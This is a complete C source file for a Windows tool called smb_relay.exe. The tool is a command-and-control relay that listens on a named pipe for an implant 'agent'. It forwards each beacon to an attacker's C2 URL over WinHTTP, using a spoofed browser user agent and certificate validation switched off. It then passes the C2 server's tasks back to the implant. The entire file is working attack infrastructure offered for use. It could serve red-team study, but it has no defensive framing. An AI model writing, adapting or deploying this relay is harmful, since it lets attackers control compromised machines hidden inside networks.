#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define RELAY_BUF 262144 /* 256 KB max payload */
#define PIPE_INSTANCES 1 /* one agent at a time; increase for concurrent */
#define C2_TIMEOUT_MS 30000

static int g_verbose = 0;

#define LOG(fmt, ...)                                            \
    do                                                           \
    {                                                            \
        if (g_verbose)                                           \
            fprintf(stdout, "[relay] " fmt "\n", ##__VA_ARGS__); \
    } while (0)
#define ERR(fmt, ...) fprintf(stderr, "[relay] ERROR " fmt "\n", ##__VA_ARGS__)

/* pipe I/O helpers */

static BOOL pipe_read_exact(HANDLE h, void *buf, DWORD len)
{
    DWORD done = 0;
    while (done < len)
    {
        DWORD nr = 0;
        if (!ReadFile(h, (char *)buf + done, len - done, &nr, NULL) || nr == 0)
            return FALSE;
        done += nr;
    }
    return TRUE;
}

static BOOL pipe_write_exact(HANDLE h, const void *buf, DWORD len)
{
    DWORD done = 0;
    while (done < len)
    {
        DWORD nw = 0;
        if (!WriteFile(h, (const char *)buf + done, len - done, &nw, NULL) || nw == 0)
            return FALSE;
        done += nw;
    }
    return TRUE;
}

/* wide-string helper */

static wchar_t *to_wide(const char *s)
{
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0)
        return NULL;
    wchar_t *w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (w)
        MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

/* ---- WinHTTP POST → C2 ---- */

static char *c2_post(const char *url, const char *body_json)
{
    wchar_t *url_w = to_wide(url);
    if (!url_w)
        return NULL;

    wchar_t host[512] = {0};
    wchar_t path[1024] = {0};

    URL_COMPONENTS uc = {0};
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host;
    uc.dwHostNameLength = 512;
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = 1024;

    if (!WinHttpCrackUrl(url_w, 0, 0, &uc))
    {
        free(url_w);
        return NULL;
    }
    free(url_w);

    BOOL secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = uc.nPort ? uc.nPort : (INTERNET_PORT)(secure ? 443 : 80);

    HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess)
        return NULL;

    HINTERNET hConn = WinHttpConnect(hSess, host, port, 0);
    if (!hConn)
    {
        WinHttpCloseHandle(hSess);
        return NULL;
    }

    DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST",
                                        path[0] ? path : L"/",
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq)
    {
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSess);
        return NULL;
    }

    WinHttpAddRequestHeaders(hReq,
                             L"Content-Type: application/json\r\nAccept: application/json",
                             (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    /* skip cert validation for self-signed C2 certs */
    if (secure)
    {
        DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    }

    WinHttpSetTimeouts(hReq, C2_TIMEOUT_MS, C2_TIMEOUT_MS,
                       C2_TIMEOUT_MS, C2_TIMEOUT_MS);

    DWORD body_len = (DWORD)strlen(body_json);
    BOOL ok = WinHttpSendRequest(hReq,
                                 WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 (LPVOID)body_json, body_len, body_len, 0);
    if (!ok || !WinHttpReceiveResponse(hReq, NULL))
    {
        WinHttpCloseHandle(hReq);
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSess);
        return NULL;
    }

    /* read response */
    char *resp = NULL;
    size_t resp_len = 0;
    DWORD avail = 0;

    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0)
    {
        char *tmp = (char *)realloc(resp, resp_len + avail + 1);
        if (!tmp)
            break;
        resp = tmp;
        DWORD nr = 0;
        WinHttpReadData(hReq, resp + resp_len, avail, &nr);
        resp_len += nr;
        resp[resp_len] = '\0';
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);

    return resp;
}

/* relay loop: read from pipe, forward to C2, write response back */

static void relay_loop(HANDLE hPipe, const char *c2_url)
{
    char *in_buf = (char *)malloc(RELAY_BUF);
    char *out_buf = (char *)malloc(RELAY_BUF);
    if (!in_buf || !out_buf)
    {
        ERR("malloc failed");
        free(in_buf);
        free(out_buf);
        return;
    }

    for (;;)
    {
        LOG("waiting for agent connection...");

        /* wait for agent to connect */
        BOOL connected = ConnectNamedPipe(hPipe, NULL)
                             ? TRUE
                             : (GetLastError() == ERROR_PIPE_CONNECTED);
        if (!connected)
        {
            ERR("ConnectNamedPipe failed (%lu)", GetLastError());
            break;
        }
        LOG("agent connected");

        /* read beacon: 4-byte LE length + payload */
        uint32_t in_len = 0;
        if (!pipe_read_exact(hPipe, &in_len, 4) || in_len == 0 || in_len >= RELAY_BUF)
        {
            ERR("bad beacon length %u", in_len);
            goto next;
        }
        if (!pipe_read_exact(hPipe, in_buf, in_len))
        {
            ERR("pipe read beacon failed");
            goto next;
        }
        in_buf[in_len] = '\0';
        LOG("beacon recv %u bytes", in_len);

        /* forward to C2 */
        char *resp = c2_post(c2_url, in_buf);
        if (!resp)
        {
            ERR("c2_post failed — sending empty task");
            resp = strdup("{\"p\":\"\"}");
            if (!resp)
                goto next;
        }
        LOG("c2 response: %.80s", resp);

        /* write task back: 4-byte LE length + C2 response */
        uint32_t out_len = (uint32_t)strlen(resp);
        BOOL ok = pipe_write_exact(hPipe, &out_len, 4) &&
                  pipe_write_exact(hPipe, resp, out_len);
        free(resp);

        if (!ok)
            ERR("pipe write task failed");
        else
            LOG("task sent %u bytes", out_len);

    next:
        FlushFileBuffers(hPipe);
        DisconnectNamedPipe(hPipe);
        LOG("disconnected, looping");
    }

    free(in_buf);
    free(out_buf);
}

/* entry point */

int main(int argc, char **argv)
{
    const char *pipe_name = NULL;
    const char *c2_url = NULL;

    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--pipe") == 0 && i + 1 < argc)
            pipe_name = argv[++i];
        else if (strcmp(argv[i], "--c2") == 0 && i + 1 < argc)
            c2_url = argv[++i];
        else if (strcmp(argv[i], "--verbose") == 0)
            g_verbose = 1;
    }

    if (!pipe_name || !c2_url)
    {
        fprintf(stderr, "usage: smb_relay.exe --pipe <name> --c2 <beacon_url> [--verbose]\n");
        return 1;
    }

    char full_pipe[512];
    snprintf(full_pipe, sizeof(full_pipe), "\\\\.\\pipe\\%s", pipe_name);

    wchar_t full_pipe_w[512];
    MultiByteToWideChar(CP_UTF8, 0, full_pipe, -1, full_pipe_w, 512);

    LOG("creating pipe %s", full_pipe);
    LOG("c2 url: %s", c2_url);

    HANDLE hPipe = CreateNamedPipeW(
        full_pipe_w,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_INSTANCES,
        RELAY_BUF, RELAY_BUF,
        0,   /* default timeout */
        NULL /* default security */
    );

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        ERR("CreateNamedPipe failed (%lu)", GetLastError());
        return 1;
    }

    LOG("pipe created, entering relay loop");
    relay_loop(hPipe, c2_url);

    CloseHandle(hPipe);
    return 0;
}
